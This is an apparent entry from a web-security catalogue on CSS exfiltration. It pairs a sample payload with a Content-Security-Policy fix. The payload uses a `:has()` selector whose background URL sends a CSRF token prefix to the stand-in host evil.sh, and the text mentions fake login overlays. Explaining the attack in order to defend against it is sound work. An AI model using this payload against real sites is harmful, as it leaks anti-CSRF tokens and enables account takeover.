---
order: 11
cwe: 200
title: CSS exfiltration
category: injection
severity: medium
sink: |-
    <style> built from user input
payload: |-
    html:has(input[name=csrf][value^="a"]) {
      background: url(//evil.sh?c=a);
    }
fix: |
    Content-Security-Policy: style-src 'self'; img-src 'self'
    // never interpolate user input into style blocks
refs:
    - https://portswigger.net/research/blind-css-exfiltration
---

No script needed: one selector per possible character leaks a token prefix by prefix through background-image requests. `:has()` matters — a hidden input is never rendered, so a background on the input itself never loads. Injected styles also redraw the page — a fake login box over your real one. A strict `img-src` and `style-src` close the channel.
